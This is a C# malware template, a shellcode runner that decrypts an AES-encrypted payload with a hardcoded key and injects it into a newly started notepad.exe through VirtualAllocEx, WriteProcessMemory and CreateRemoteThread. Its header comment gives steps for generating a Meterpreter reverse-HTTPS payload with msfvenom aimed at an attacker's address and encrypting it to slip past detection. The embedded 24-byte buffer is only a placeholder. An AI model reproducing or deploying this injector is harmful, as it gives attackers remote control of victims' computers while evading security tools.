// =============================================================================
// TEMPLATE — replace buf with your encrypted shellcode before compiling
//
// Generate and encrypt shellcode:
//   1. msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f csharp
//   2. Paste bytes into aes-shellcode-encryption.cs and run it
//   3. Copy the output buf here and update the byte count
//
// Change target process on line ~80: Process.Start("notepad.exe")
// =============================================================================

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace ProcessInjectionRunner
{
    class Program
    {
        // P/Invoke declarations for process injection
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        // Constants
        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint MEM_COMMIT = 0x1000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            // Your AES-encrypted shellcode (24 bytes as provided; expand to 896 if full)
            byte[] buf = new byte[24] {
                0x8a, 0x73, 0x4c, 0xcf, 0x5b, 0x9a, 0x3c, 0x46, 0x79, 0xe5, 0x73, 0x5f,
                0x13, 0x65, 0x7d, 0x14, 0x37, 0x29, 0x3b, 0x0c, 0xfb, 0x6a, 0x4b, 0xc2
            };

            // Decrypt the shellcode
            byte[] decryptedShellcode = Decrypt(buf);

            // Perform process injection
            InjectAndExecute(decryptedShellcode);
        }

        static byte[] Decrypt(byte[] encryptedData)
        {
            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = Encoding.UTF8.GetBytes("t51JpSvoag6052x1go4PvuSiLOwNWifX");

                // Extract IV (first 16 bytes)
                byte[] iv = new byte[16];
                Array.Copy(encryptedData, 0, iv, 0, 16);
                aes.IV = iv;

                // Get ciphertext (rest of the data)
                byte[] ciphertext = new byte[encryptedData.Length - 16];
                Array.Copy(encryptedData, 16, ciphertext, 0, ciphertext.Length);

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                using (var ms = new System.IO.MemoryStream(ciphertext))
                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                using (var resultStream = new System.IO.MemoryStream())
                {
                    cs.CopyTo(resultStream);
                    return resultStream.ToArray();  // Decrypted shellcode
                }
            }
        }

        static void InjectAndExecute(byte[] shellcode)
        {
            // Step 1: Start the target process (notepad.exe for testing)
            Process targetProcess = Process.Start("notepad.exe");
            targetProcess.WaitForInputIdle();  // Wait for it to load

            // Step 2: Open the target process
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcess.Id);
            if (hProcess == IntPtr.Zero)
            {
                return;
            }

            // Step 3: Allocate memory in the target process
            IntPtr allocAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (allocAddr == IntPtr.Zero)
            {
                CloseHandle(hProcess);
                return;
            }

            // Step 4: Write the decrypted shellcode to the allocated memory
            IntPtr bytesWritten;
            if (!WriteProcessMemory(hProcess, allocAddr, shellcode, (uint)shellcode.Length, out bytesWritten))
            {
                CloseHandle(hProcess);
                return;
            }

            // Step 5: Create a remote thread to execute the shellcode
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocAddr, IntPtr.Zero, 0, IntPtr.Zero);

            // Cleanup
            CloseHandle(hThread);
            CloseHandle(hProcess);
            targetProcess.WaitForExit();  // Optional: Wait for target to exit
        }
    }
}